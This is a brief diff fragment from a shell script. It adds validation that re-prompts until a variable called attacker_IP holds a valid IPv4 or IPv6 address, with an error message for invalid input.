+        if ! is_valid_ip "${attacker_IP}"; then
+            echo -e "${RED}Invalid IP.${NC} Please specify a valid IPv4 or IPv6 address."
+            continue
         fi
+        break
     done
 }
 
